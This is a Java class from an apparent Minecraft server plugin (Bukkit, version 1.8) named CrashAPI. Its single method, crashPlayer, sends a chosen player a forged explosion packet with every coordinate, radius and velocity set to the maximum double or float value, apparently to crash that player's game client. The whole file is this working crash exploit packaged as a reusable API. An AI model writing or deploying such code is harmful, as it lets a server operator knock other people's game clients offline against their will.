package com.lothus.core.api.crash;

import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class CrashAPI {

	private static Object packet;

	public static void crashPlayer(Player player) {
		try {
			CraftPlayer cp = (CraftPlayer) player;
			EntityPlayer entityPlayer = cp.getHandle();
			PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
			entityPlayer.playerConnection.sendPacket(packet);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}
}